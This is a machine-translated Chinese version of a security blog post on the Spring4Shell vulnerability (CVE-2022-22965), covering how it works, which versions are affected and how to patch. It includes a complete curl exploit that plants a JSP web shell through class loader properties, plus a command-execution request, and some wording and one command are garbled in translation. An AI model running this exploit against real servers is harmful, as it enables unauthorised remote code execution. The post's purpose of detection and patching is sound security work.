# 如何手动检测和利用 spring 4 shell(CVE-2022-22965)| Pentest-Tools.com

> 原文：<https://pentest-tools.com/blog/detect-exploit-spring4shell-cve-2022-22965>

就在 Log4Shell 残酷地震撼了我们的世界几个月后，当一切开始看起来平静祥和的时候，上帝释放出了我们的脆弱。一个流行的 Java 框架中的另一个类似命名的漏洞——**spring 4 shell**—被曝光。

CVE-2022-22965 和它(稍微)年长的兄弟姐妹一样危险和广泛吗？请继续关注我们，一探究竟！

## **什么是 Spring4Shell？**

Spring4Shell 或 [CVE-2022-22965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22965) 是 Java Spring 框架中的一个远程代码执行漏洞，它是由将用户控制的值传递给 Spring 的类加载器的各种属性的能力引起的。这使得未经验证的远程攻击者有可能注入 web 外壳并获得 RCE。

## 【Spring4Shell 如何工作

如前所述，您需要摆弄类加载器，并达到您可以**成功地将 web shell 注入目标系统**的程度。根据在 Spring 框架上运行的应用程序，可能有不同的方法来利用这个漏洞。

目前，大多数 Apache Tomcat 服务器似乎都以各种已发布的 POC 为目标。这就是为什么我们现在将继续描述我们的同事 [Iulian](https://pentest-tools.com/blog/authors/pentest-iulian) 如何开发针对 Apache Tomcat web 服务器的[漏洞利用模块](https://pentest-tools.com/exploit-helpers/sniper#exploit-modules)，帮助您获得漏洞验证。

这个想法是使用类加载器来覆盖日志功能中的关键属性，这将导致**日志记录器创建一个 web shell 而不是日志文件**。

这些属性如下:

1.  `class.module.classLoader.resources.context.parent.pipeline.first.pattern`。这决定了日志文件的内容。这里是您想要放置 web shell 代码的地方。

2.  `class.module.classLoader.resources.context.parent.pipeline.first.prefix`。前缀是指日志文件的名称。这里是您命名 web shell 文件的地方。

3.  `class.module.classLoader.resources.context.parent.pipeline.first.suffix`。后缀表示日志文件的扩展名。这个必须是. jsp。

4.  `class.module.classLoader.resources.context.parent.pipeline.first.directory`。directory 属性确定日志文件的位置。如果可以远程访问根目录，可以使用 webapps/ROOT 作为 directory 属性的值，并且应该能够通过访问/与 web shell 进行交互。jsp

5.  `class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat`。这是可选的，它有助于提高攻击者的生活质量，因为如果该属性为空，它会从输出中删除繁琐的日志时间戳。

## **CVE 的业务影响-2022-22965**

成功利用 Spring4Shell 后，未经验证的远程攻击者可以获得对目标的控制，并危及整个底层系统的安全。

虽然这听起来像是可怕的事情，就像是 Log4Shell 的重演，但请记住，互联网上流传的 POC 将部署在 Tomcat 上的易受攻击的应用程序作为 WAR，这是**而不是**默认配置。

这让我相信易受攻击的目标不会像在 [Log4Shell](https://pentest-tools.com/blog/log4shell-scanner-detect-cve-2021-44228) 中那样容易被发现。

然而，整个安全社区已经无数次证明，它充满了聪明能干的头脑，能够找出甚至是最不可想象的利用方法。

因此，即使您不运行上述特定配置，**请考虑更新到下面列出的一个修补版本**。

## **如何在道德黑客活动中手动检测 spring 4 shell**

这里有一个 curl 命令，您可以使用它将 web shell 上传到易受攻击的目标。它遵循“Spring4Shell 如何工作”一节中描述的 5 个步骤，并包含以下内容:

*   模式中的 web shell 代码

*   的。后缀中的 jsp 扩展名

*   目录属性中的 webapps/ROOT 根目录

*   前缀中的 webshell_name

*   文件日期格式为空。

```
curl -H "prefix":"<%" -H "suffix":"%>//" -H "c":"Runtime" -H
"Content-Type":"application/x-www-form-urlencoded" -d
'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(new String[]{%22/bin/sh%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=<webshell_name>&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' http://127.0.0.1:<port>/<path>
```

一旦 web shell 上传到根目录，您就可以访问它并提供带有以下 GET 请求的命令:

```
curl http://127.0.0.1:/.jsp?cmd=<commands>
```

## **易受攻击的 Spring 版本**

| 产品名称 | 易受攻击版本 | 范围 |
| --- | --- | --- |
| 弹簧框架 | 5.3.x | 5.3.0 – 5.3.17 |
| 弹簧框架 | 5.2.x | 5.2.0 – 5.2.19 |

## **如何缓解 CVE-2022-22965**

运行 5.3.x 易受攻击版本的 Spring Framework 用户应立即升级到 5.3.18 或更新版本，而运行 5.2.x 版本的用户应至少升级到 5.2.20。

## **Spring4Shell 预计影响和大局**

全球有 [16%的组织](https://blog.checkpoint.com/2022/04/05/16-of-organizations-worldwide-impacted-by-spring4shell-zero-day-vulnerability-exploitation-attempts-since-outbreak/)受到 Spring4Shell RCE 漏洞的影响，估计有 **28%的组织来自软件行业**，识别和修补业务关键资产仍然是当务之急。

像 Spring4Shell 和 [Log4Shell](https://pentest-tools.com/blog/how-we-detect-log4shell) 这样的高风险漏洞提醒我们，如果没有主动的安全评估、多层安全和渗透到团队和角色的意识培训，技术生态系统是多么脆弱。

如果您喜欢这个技术指南，并且更好地理解了这个 CVE 的细节，请相信我们会在下面的文章中介绍更多的细节。